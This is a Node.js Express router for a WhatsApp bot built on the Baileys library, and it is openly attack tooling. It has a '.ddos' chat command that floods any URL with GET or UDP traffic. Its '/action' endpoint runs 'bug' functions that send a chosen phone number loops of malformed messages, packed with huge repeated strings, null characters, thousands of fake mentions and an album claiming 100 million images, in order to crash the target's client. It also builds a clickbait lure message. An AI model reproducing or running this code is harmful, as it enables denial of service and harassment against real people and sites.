const {
  default: makeWASocket,  
    DisconnectReason,
    delay,
    makeWALegacySocket,
    BufferJSON,
    Browsers,
    initInMemoryKeyStore,
    extractMessageContent,
    makeInMemoryStore,
    proto, 
    WAProto,
    useMultiFileAuthState,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    getBinaryNodeChild,
    jidDecode,
    areJidsSameUser,
    generateWAMessage,
    generateForwardMessageContent,
    generateWAMessageContent, 
    generateWAMessageFromContent,
    getAggregateVotesInPollMessage,
    jidNormalizedUser, 
    WAMessageStubType,
    getContentType,
    relayMessage,
    WA_DEFAULT_EPHEMERAL,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const express = require("express");
const Router = express.Router();
const fs = require("fs");
const crypto = require("crypto");
const path = require("path");
const {
  deleteTemp,
  makeDirIsNotExists
} = require("../utils/functions");

const { ddosAttack } = require("./lib/ddos");

const sessionDir = path.join(__dirname, "../session");
makeDirIsNotExists(sessionDir).catch(() => {});

const { chatAi, modelan } = require("../utils/functions"); 
async function ai(prompt) {
  return new Promise((resolve, reject) => {
    let hasil = "";
    chatAi(
      "gpt-5",
      prompt,
      (delta) => {
        hasil += delta; 
      },
      (done) => {
        resolve(done || hasil); 
      }
    );
  });
}

const activeSockets = new Map();
async function ensureSocketForNumber(phoneNumber) {
  const pn = String(phoneNumber).replace(/[^0-9]/g, "");
  // kalau sudah ada socket aktif yang valid, return
  if (activeSockets.has(pn)) {
    const info = activeSockets.get(pn);
    if (info && info.sock) return info.sock;
  }

  const sessionPath = path.join(sessionDir, pn);
  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    printQRInTerminal: false,
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    syncFullHistory: false
  });
  
async function image(url) {
const { imageMessage } = await generateWAMessageContent({ image: { url },}, {
  upload: sock.waUploadToServer
  })
  return imageMessage
}

  // event: connection update
  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    console.log(`[${pn}] connection.update =>`, connection);

    if (connection === "open") {
      activeSockets.set(pn, { sock, statePath: sessionPath });
      console.log(`[${pn}] Socket saved to activeSockets (open)`);
      try {
        await delay(200);
        await sock.sendMessage(sock.user.id, { text: "_*Berhasil terhubung ke WhatsApp!*_" });
      } catch (e) { /* ignore send errors */ }
      return;
    }

    if (connection === "close") {
      const statusCode = new Boom(lastDisconnect?.error)?.output?.statusCode;
      console.log(`[${pn}] closed with code:`, statusCode);

      if (activeSockets.has(pn)) activeSockets.delete(pn);

      if (
        statusCode === DisconnectReason.connectionLost ||
        statusCode === DisconnectReason.connectionReplaced ||
        statusCode === DisconnectReason.restartRequired ||
        statusCode === DisconnectReason.timedOut
      ) {
        try {
          console.log(`[${pn}] trying reconnect...`);
          await ensureSocketForNumber(pn);
        } catch (e) {
          console.error(`[${pn}] reconnect failed:`, e);
        }
      } else if (statusCode === DisconnectReason.loggedOut) {
        // hapus session files jika logout
        try {
          await deleteTemp(false, sessionPath);
        } catch (e) { /* ignore */ }
      } else {
        try { sock.end("Unknown DisconnectReason: " + statusCode + "|" + connection); } catch (e) { /* ignore */ }
      }
    }
  });
  
 sock.ev.on("creds.update", saveCreds);
 sock.ev.on("messages.upsert", async ({ messages }) => {
  try {
    const msg = messages[0];
    if (!msg.message) return;
    const body = msg.message.conversation || msg.message.extendedTextMessage?.text;
    if (!body) return;
    const from = msg.key.remoteJid; 
    const isGroup = from.endsWith("@g.us"); 
    const sender = msg.key.participant || msg.key.remoteJid;
    const isBot = msg.key.fromMe; 
    const prefixes = [".", "!", "#", "/", " "];
    const usedPrefix = prefixes.find(p => body.startsWith(p));
    if (!usedPrefix) return;

    const command = body.slice(usedPrefix.length).split(" ")[0].toLowerCase();
    const text = body.slice(usedPrefix.length + command.length + 1).trim();

const frpay = {key : { remoteJid:"0@s.whatsapp.net",id:"REQPAY"+Math.floor(Math.random()*1e6),participant:"0@s.whatsapp.net"},message:{requestPaymentMessage:{currencyCodeIso4217:"IDR",amount1000:String(Math.floor(Math.random()*5e5+1e5)),requestFrom:msg.sender,noteMessage:{stickerMessage:{url:"https://mmg.whatsapp.net/v/t62.15575-24/519772994_1880450272736126_8894645943848884651_n.enc?ccb=11-4&oh=01_Q5Aa2AGONA8PtRh9eqxl0EDqvxr_gJXfmHtX6uety7GfTwYnvg&oe=68986DC0&_nc_sid=5e03e0&mms3=true",fileSha256:"e9fy2V2mLQdwJfLlVkY+seoBfAafbvgKJ6K9bdw9jxM=",fileEncSha256:"o7iQKQWiOOBpWSYGY6oefYggCmDU7UO9W1tZx8J6aoY=",mediaKey:"o2mu3wa+ynfKJ1kjQDMtDD5RBSBH6tTR801EFz9coDQ=",mimetype:"image/webp",height:64,width:64,directPath:"/o1/v/t24/f2/m238/AQNTXHve8NJAcYVaqLBmTCMx1r-hxBGF-ht85xYI1NlmMAW40ZSd5NJAAxzEedNN7xguj6KugTE4EOOYdh1bwzguSPLM7DRknWk3YydxiQ?ccb=9-4&oh=01_Q5Aa2AFmBMIBTxdhwGiiXKQgFIwREBJW1kHuqDutw2XEOzhfNg&oe=68984648&_nc_sid=e6ed6c"}},amount:{value:"2420",offset:1e3,currencyCode:"IDR"},background:{id:"100",fileLength:"928283",width:1e3,height:1e3,mimetype:"image/webp",placeholderArgb:4294901760,textArgb:4294967295,subtextArgb:4278190080}}}};
const forder = {key : {remoteJid:"status@broadcast",fromMe:false,id:"BAE5C9E3C9A6C8D6",participant:"0@s.whatsapp.net"},message:{orderMessage:{productId:"8569472943180260",title:null,description:null,currencyCode:"IDR",priceAmount1000:"91000",message:text,thumbnailUrl:"https://img100.pixhost.to/images/718/540724665_a7bf39d4.jpg",surface:"whyuxD"}}};
const fpay = { key: { fromMe: false, participant: "0@s.whatsapp.net", ...(msg.chat ? { remoteJid: "status@broadcast" } : {}) }, message: { "paymentInviteMessage": { "serviceType": 3, "expiryTimestamp": "200"}}};

    const reply = async (teks) => {
      try {
        await sock.sendMessage(from, { text: teks }, { quoted: frpay });
      } catch (e) {
        try { await sock.sendMessage(from, { text: teks }); } catch (_) {}
      }
    };
    if (command === "ddos") {
      if (!text) {
        await reply("⚠️ Format salah!\nGunakan: `.ddos url|duration|concurrency|method`\n\nContoh: .ddos https://example.com|60|10|GET\n\nList method: GET/UDP");
        return;
      }
      const [urlTarget, duration, concurrency, method] = text.split("|").map(a => a.trim());
      if (!urlTarget || !duration || !concurrency || !method) {
        await reply("Format salah!\nGunakan: `.ddos url|duration|concurrency|method`");
        return;
      }
      try {
        await ddosAttack(sock, urlTarget, parseInt(duration), parseInt(concurrency), method.toUpperCase(), reply);
      } catch (err) {
        console.error("Error running ddos:", err);
        await reply("❌ Error: " + err.message);
      }
    }
    if (command === "crsl") {
let mg = generateWAMessageFromContent(
  msg.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: `Notification!`
          },
          footer: {
            text: `whyuxD`
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
                  title: ``,
                  subtitle: 'whyuxD',
                  productMessage: {
                    product: {
                      productImage: await image("https://files.catbox.moe/aauj7v.webp"),
                      productId: "9116471035103640",
                      title: `hai`,
                      description: "",
                      currencyCode: "IDR",
                      priceAmount1000: "5000200",
                      retailerId: "4144242",
                      url: "",
                      productImageCount: 1,
                    },
                    businessOwnerJid: "6283189053897@s.whatsapp.net",
                  },
                  hasMediaAttachment: false
                }),
                body: {
                  text: "Hei... jangan buru-buru skip... Ada sesuatu yang ingin ku kasih tau, tapi tdk bisa ditulis langsung di sini. Kalau penasaran, tekan tombol di bawah ini agar kamu mengerti maksudku. ku jamin kamu akan kaget setelah melihat isinya!!",
                },
                nativeFlowMessage: {
                  buttons: [
                    {
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"klik disini\",\"id\":\"dongo\"}"
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  { userJid: msg.sender, quoted : forder }
);
await sock.relayMessage(mg.key.remoteJid, mg.message, {
  messageId: mg.key.id,
});
}
    if (command === "ai") {
      if (!text) {
        await reply("⚠️ Masukkan text!\nContoh: .ai siapa presiden indonesia sekarang?");
        return;
      }
      try {
        const result = await ai(text); 
        await reply(result);
      } catch (err) {
        console.error("messages.upsert error (ai):", err);
        await reply("❌ Error AI: " + (err.message || String(err)));
      }
    }
  } catch (e) {
    console.error("messages.upsert error:", e);
  }
});

  return sock;
}

Router.get("/", async (req, res) => {
  const phoneNumberRaw = req.query.phoneNumber;
  if (!phoneNumberRaw) return res.status(400).json({ error: "Phone number is required" });

  const phoneNumber = String(phoneNumberRaw).replace(/[^0-9]/g, "");
  if (!phoneNumber) return res.status(400).json({ error: "Invalid phone number" });

  try {
    const sock = await ensureSocketForNumber(phoneNumber);

    const registered = Boolean(sock?.authState?.creds?.registered);
    if (!registered) {
      await delay(500);
      let pairingCode = await sock.requestPairingCode(phoneNumber, "WAHYUXDI");
      pairingCode = pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode;
      console.log(`[${phoneNumber}] Pairing code:`, pairingCode);
      return res.status(200).json({ code: pairingCode });
    }

    const isActive = activeSockets.has(phoneNumber);
    return res.status(200).json({ connected: !!isActive });
  } catch (err) {
    console.error("connect error:", err);
    return res.status(500).json({ error: "Something went wrong while connecting" });
  }
});

Router.get("/status", async (req, res) => {
  const phoneNumberRaw = req.query.phoneNumber;
  if (!phoneNumberRaw) return res.status(400).json({ error: "Phone number is required" });
  const phoneNumber = String(phoneNumberRaw).replace(/[^0-9]/g, "");
  const isActive = activeSockets.has(phoneNumber);
  res.json({ connected: !!isActive });
});

Router.get("/action", async (req, res) => {
  const ownerRaw = req.query.owner;
  const type = req.query.type;
  const targetRaw = req.query.target;

  if (!ownerRaw || !type || !targetRaw) {
    return res.status(400).json({ error: "owner, type, and target are required" });
  }
  const owner = String(ownerRaw).replace(/[^0-9]/g, "");
  const target = String(targetRaw).replace(/[^0-9]/g, "");

  if (!activeSockets.has(owner)) {
    return res.status(400).json({ error: "Owner not connected" });
  }

  const { sock } = activeSockets.get(owner);
  if (!sock) return res.status(500).json({ error: "Socket not available" });

  const jid = target + "@s.whatsapp.net";

function pseudoRandomBytes(length) {
  const arr = [];
  for (let i = 0; i < length; i++) {
    arr.push(Math.floor(Math.random() * 256)); // nilai 0-255
  }
  return Buffer.from(arr);
}

// ################## //
// === FUNCTION BUG === //
async function OfferMpM(target) {
for (let iter = 1; iter <= 100; iter++) {
  const msg = await generateWAMessageFromContent(
    target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { 
                text: "wxx1-vtr ".repeat(9000)
              }, 
              footer: {
                text: "wxx"
              }, 
              nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                  limited_time_offer: {
                    text: "whyuxD", 
                    url: "https://t.me/whyuxD", 
                    copy_code: "𑲭".repeat(9000), 
                    expiration_time: Date.now() * 250208
                  }
                }),
                buttons: [
                  { 
                    name: "single_select", 
                    buttonParamsJson: JSON.stringify({ status: true })
                  },
                  { 
                    name: "mpm",
                    buttonParamsJson: JSON.stringify({ status: true })
                  }
                ]
              },
              contextInfo: {
                participant: target,
                mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)],
                remoteJid: "7eppeliiiiiiii", 
                stanzaId: "123",
                quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() / 7
                },
                isForwarded: true, 
                forwardingScore: 9999,
                forwardedNewsletterMessageInfo: {
                  newsletterName: "whyuxD",
                  newsletterJid: "123025022008@newsletter",
                  serverId: 7
                }
              }
            }
          }
        }
      }
    }, { userJid: target } 
  );
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
 }
}

async function AlbumBugger2(target)  {
   const album = await generateWAMessageFromContent(target, {
      albumMessage: {
         expectedImageCount: 100000000,
         expectedVideoCount: 0, //trigger
      }
   }, {});   
   const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&_nc_hot=1758521044",
        mediaKeyTimestamp: 1758521043,
        isSampled: true, 
        viewOnce: false, 
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true, 
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363343611802180@newsletter", 
            newsletterName: "whyuxD", 
            contentType: "UPDATE_CARD", 
            accessibilityText: "\u0000".repeat(9000), 
            serverMessageId: 18888888
          }, 
          mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=", 
        annotations: [
          {
            polygonVertices: [
              {
                x: 0.05515563115477562,
                y: 0.4132135510444641
              },
              {
                x: 0.9448351263999939,
                y: 0.4132135510444641
              },
              {
                x: 0.9448351263999939,
                y: 0.5867812633514404
              },
              {
                x: 0.05515563115477562,
                y: 0.5867812633514404
              }
            ],
            newsletter: {
              newsletterJid: "120363343611802180@newsletter",
              serverMessageId: 3868,
              newsletterName: "wxx1",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(1000) 
            }
          }
        ]
     }
   };   
   const messages = [];
   for (let i = 0; i < 100; i++) {
     const imgMsg = await generateWAMessageFromContent(target, imagePayload, {});  
      imgMsg.message.messageContextInfo = {  
         messageAssociation: {  
            associationType: 1,  
            parentMessageKey: album.key  
         }  
      };  
      messages.push(imgMsg);
   }
   await sock.relayMessage(target, album.message, {
      messageId: album.key.id,
      participant: { jid: target }
   });   
   for (const msg of messages) {
      await sock.relayMessage(target, msg.message, {
         messageId: msg.key.id,
         participant: { jid: target }
      });
   }
}

// ###################### //
// ###################### //
  try {
    let message = "";
    if (type === "bug_a") {
      await OfferMpM(jid)
      return res.json({ success: true, message: "Bug telah dikirim!" });
    } else if (type === "bug_b") {
      await AlbumBugger2(jid)
      return res.json({ success: true, message: "Bug telah dikirim" });
    } else if (type === "bug_c") {
      message = "Time: " + new Date().toISOString();
      await sock.sendMessage(jid, { text: message });
      return res.json({ success: true, message: "Ping" });
    } else {
      return res.status(400).json({ error: "Unknown type" });
    }
  } catch (err) {
    console.error("action send error:", err);
    return res.status(500).json({ error: "Gagal mengirim pesan: " + (err.message || String(err)) });
  }
});

/**
 * GET /connect/disconnect
 */
Router.get("/disconnect", async (req, res) => {
  const phoneNumberRaw = req.query.phoneNumber;
  if (!phoneNumberRaw) return res.status(400).json({ error: "phoneNumber required" });
  const phoneNumber = String(phoneNumberRaw).replace(/[^0-9]/g, "");

  if (!activeSockets.has(phoneNumber)) {
    const sessionPath = path.join(sessionDir, phoneNumber);
    try {
      await deleteTemp(false, sessionPath);
      return res.json({ success: true, message: "Session cleaned" });
    } catch (e) {
      return res.status(500).json({ error: "Gagal membersihkan session" });
    }
  }

  const { sock, statePath } = activeSockets.get(phoneNumber);
  try { await sock.logout(); } catch(e){ /* ignore */ }
  try {
    activeSockets.delete(phoneNumber);
    await deleteTemp(false, statePath);
  } catch (e) { /* ignore */ }
  return res.json({ success: true, message: "Disconnected" });
});

module.exports = Router;